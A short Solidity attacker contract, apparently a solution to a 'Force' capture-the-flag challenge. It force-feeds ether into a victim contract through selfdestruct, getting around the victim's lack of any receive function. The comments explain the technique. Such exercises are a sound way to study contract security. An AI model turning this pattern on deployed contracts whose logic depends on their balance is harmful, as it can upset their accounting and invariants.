// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Force.sol";

/// @title Force challenge attacker contract 
/// @notice This contract is executing a force-feeding attack to increase the balance of another contract,
/// that will be reached via selfdestruct. The victim contract does not have any function to receive
/// eth, but this call surpass this mechanism. It is necessary to send eth previously to attacker contract,
/// via constructor? or the function call itself.
contract ForceAttack {

    Force forceContract;

    constructor(address _address) public {
        forceContract = Force(_address);
    }

    function feed() public payable{
        selfdestruct(payable(address(forceContract)));
    }

}